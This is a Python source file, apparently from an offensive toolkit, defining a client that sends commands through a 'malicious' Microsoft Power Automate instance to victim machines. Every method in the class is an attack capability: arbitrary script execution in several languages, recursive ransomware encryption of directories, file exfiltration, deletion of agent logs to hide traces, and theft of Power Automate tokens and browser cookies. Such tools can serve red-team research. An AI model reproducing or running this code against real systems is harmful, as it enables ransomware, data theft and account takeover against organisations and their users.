import json
from typing import List

import requests
from pydantic.error_wrappers import ValidationError

from powerpwn.machinepwn.models.cmd_arguments import CodeExecTypeEnum, CommandArguments, CommandToRunEnum
from powerpwn.machinepwn.models.cmd_results import CommandResults


class MachinePwn:
    def __init__(self, post_url: str, debug: bool = False):
        """
        Power Pwn client to run commands through Microsoft infrastructure
        :param post_url: a URL on the malicious Microsoft instance to post commands to
        :param debug: whether to print debug messages
        """
        self.post_url = post_url
        self.debug = debug

    def run_cmd(self, arguments: CommandArguments) -> CommandResults:
        if self.debug:
            print(f"Raw command: {arguments}")

        try:
            cmd_args = json.loads(arguments.json())
        except json.JSONDecodeError:
            print(f"Bad command. Raw content: {arguments}")
            raise

        results = self._run_cmd(arguments_as_dict=cmd_args)

        cmd_res = CommandResults.parse_obj(results)
        return cmd_res

    def _run_cmd(self, arguments_as_dict: dict) -> dict:  # type: ignore
        # noinspection PyTypeChecker
        resp = requests.post(url=self.post_url, json=arguments_as_dict)

        if self.debug:
            print(f"Raw content: {resp.content.decode('utf8')}")

        try:
            return resp.json()
        except ValidationError:
            print(f"Bad response. Raw content: {resp.content.decode('utf8')}")
            raise

    def exec_py2(self, command: str) -> CommandResults:
        """
        Execute command in a Python2 interpreter
        :param command: a Python2 script encoded as a string
        :return: command results
        """
        flow_args = CommandArguments(
            command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.PYTHON, code_exec_command=command
        )
        return self.run_cmd(flow_args)

    def exec_vb(self, command: str) -> CommandResults:
        """
        Execute command in a Visual Basic interpreter
        :param command: a Visual Basic script encoded as a string
        :return: command results
        """
        flow_args = CommandArguments(
            command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.VISUALBASIC, code_exec_command=command
        )
        return self.run_cmd(flow_args)

    def exec_js(self, command: str) -> CommandResults:
        """
        Execute command in a JavaScript interpreter
        :param command: a JavaScript script encoded as a string
        :return: command results
        """
        flow_args = CommandArguments(
            command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.JAVASCRIPT, code_exec_command=command
        )
        return self.run_cmd(flow_args)

    def exec_ps(self, command: str) -> CommandResults:
        """
        Execute command in a PowerShell interpreter
        :param command: a PowerShell script encoded as a string
        :return: command results
        """
        flow_args = CommandArguments(
            command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.POWERSHELL, code_exec_command=command
        )
        return self.run_cmd(flow_args)

    def exec_cmd(self, command: str) -> CommandResults:
        """
        Execute command in a CommandLine
        :param command: a CommandLine script encoded as a string
        :return: command results
        """
        flow_args = CommandArguments(
            command_to_run=CommandToRunEnum.CODE_EXEC, code_exec_command_type=CodeExecTypeEnum.COMMANDLINE, code_exec_command=command
        )
        return self.run_cmd(flow_args)

    def ransomware(self, crawl_depth: str, dirs_to_init_crawl: List[str], encryption_key: str) -> CommandResults:
        """
        Overwrite all files in dirs_to_init_crawl with an encrypted version
        :param crawl_depth: recursively search into subdirectories this many times
        :param dirs_to_init_crawl: a list of directories to begin crawl from separated by a command (e.g.'C:\\,D:\\')
        :param encryption_key: an encryption key used to encrypt each file identified (AES256)
        :return: command results
        """
        dirs_to_init_crawl_str = ",".join(dirs_to_init_crawl)
        flow_args = CommandArguments(
            command_to_run=CommandToRunEnum.RANSOMWARE,
            ransomware_crawl_depth=crawl_depth,
            ransomware_directories_to_init_crawl=dirs_to_init_crawl_str,
            ransomware_encryption_key=encryption_key,
        )
        return self.run_cmd(flow_args)

    def exfiltrate(self, target_file_path: str) -> CommandResults:
        """
        Exfiltrate file from victim machine
        :param target_file_path: absolute path to file
        :return: command results
        """
        flow_args = CommandArguments(command_to_run=CommandToRunEnum.EXFILTRATION, exfiltrate_target_file=target_file_path)
        return self.run_cmd(flow_args)

    def cleanup(self) -> CommandResults:
        """
        Delete agent log files
        :return: command results
        """
        flow_args = CommandArguments(command_to_run=CommandToRunEnum.CLEANUP)
        return self.run_cmd(flow_args)

    def steal_power_automate_token(self) -> CommandResults:
        """
        Open a browser, go to the Power Automate website and steal the authentication token
        :return: command results
        """
        flow_args = CommandArguments(command_to_run=CommandToRunEnum.STEAL_POWER_AUTOMATE_TOKEN)
        return self.run_cmd(flow_args)

    def steal_cookie(self, fqdn: str) -> CommandResults:
        """
        Open a browser, go to the FQDN and seal its cookies
        :param fqdn: fully qualified domain name to fetch the cookies of
        :return: command results
        """
        flow_args = CommandArguments(command_to_run=CommandToRunEnum.STEAL_COOKIE, steal_cookie_fqdn=fqdn)
        return self.run_cmd(flow_args)
